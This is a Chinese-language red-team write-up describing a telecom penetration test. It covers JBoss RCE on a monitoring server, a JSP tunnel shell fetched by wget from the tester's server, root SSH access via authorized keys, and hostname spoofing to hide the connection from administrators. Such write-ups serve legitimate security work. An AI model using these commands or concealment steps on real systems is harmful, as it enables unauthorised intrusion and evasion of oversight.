# 概要
本文记录了作为一家电信公司红队成员的经历，从该公司的网络监控系统（NMS）中获取了一个立足点，并通过基于HTTP协议的SSH隧道解决了反向Shell连接的问题。此外，还搭建了一个代理以进行内部网络扫描，并使用SS7应用程序访问了CDR和VLR数据。由于信息敏感性，部分细节已被打码。

## 介绍
最近，我为一家电信公司进行了红队渗透测试。客户要求我进入其内网并控制呼叫数据记录（CDR）。如果您对CDR不熟悉，它是由电话交换机或其他电信设备生成的数据记录，包含通话的各种属性如时间、持续时间、完成状态、源号码和目标号码等。此次渗透测试经历非常独特：虽然初始立足点很容易获得，但维持稳定的Shell却是个挑战。

## 第一部分：获取远程代码执行（RCE）
### 侦察
对于任何道德黑客或渗透测试人员来说，侦察是至关重要的一步。“磨刀不误砍柴工”这句话在渗透测试中尤为适用。有效的侦察包括DNS枚举、ASN与BGP查找、利用搜索引擎进行被动侦察、检查公开代码库中的潜在漏洞以及必要时针对员工开展社会工程学攻击（如鱼叉式网络钓鱼），前提是能够绕过防病毒软件和垃圾邮件过滤器。
- **DNS枚举**：例如，使用`aiodnsbrute`工具进行全面扫描。
  ```shell
  aiodnsbrute -v -t 7000 --no-verify -w dns-list.uniq.lst [REDACTED].com | grep -v Timeout | grep -v Misformatted | grep -v exception
  ```
- **全端口扫描**：发现了特定子域`e[REDACTED]-nms.[REDACTED].com`上运行着JBoss服务的14100端口。

### 远程代码执行
识别出存在漏洞后，下一步是利用它来实现远程代码执行。对于JBoss服务，可以参考以下资源了解如何利用相关漏洞：
- [JBoss:您进入企业网络的桥梁](https://www.redteam-pentesting.de/publications/2010-04-21-JBoss-Bridging-the-Gap-Between-the-Enterprise-and-You_Ruhr-Universitaet-Bochum_RedTeam-Pentesting.pdf)
- [hacking_and_securing_jboss](https://doc.lagout.org/Others/hacking_and_securing_jboss.pdf)

具体操作步骤如下：
1. 使用`jexboss`工具探测并验证漏洞的存在：
   ```shell
   ./jexboss.py -u http://[REDACTED]:14100/
   ```
2. 利用JMXInvokerServlet方法执行远程命令。

## 通过HTTP隧道建立稳定连接
尽管成功获得了RCE，但直接建立反向Shell并不稳定。因此，决定采用基于HTTP协议的SSH隧道来解决这一问题。
1. **创建TCP隧道**：首先，在Web服务器和NMS之间架设一个桥接器，支持除HTTP/HTTPS外的其他协议通信。
2. **设置SSH端口转发**：随后配置本地2222端口到NMS服务器22端口的端口转发，使得可以通过HTTP上的SSH连接至NMS。
3. **配置SSH服务器**：确保允许root登录并将公钥添加到`authorized_keys`文件中以便无密码访问。
4. **建立动态SSH隧道**：最后，启动SOCKS代理以供Metasploit使用，从而进一步深入内网。

### 实现步骤
- 使用ABPTTS工具生成基于JSP的shell，并上传至目标服务器。
  ```shell
  python abpttsfactory.py -o jexws4.jsp
  wget http://[MY SERVER]/jexws4.jsp -O [DESTINATION PATH]
  ```
- 配置ABPTTS客户端以建立HTTP上的TCP隧道。
  ```shell
  python abpttsclient.py -c [CONFIG FILE] -u [URL TO SHELL] -f 127.0.0.1:2222/127.0.0.1:22
  ```

### 隐藏连接踪迹
为了掩盖身份信息，采取了以下措施：
1. 在自己的服务器上创建与NMS服务器相同用户名的新用户。
2. 更改自己服务器的主机名为NMS服务器相同的名称，减少被发现的风险。

通过上述方法，不仅成功地获得了稳定的Shell连接，而且能够在一定程度上避免引起管理员注意。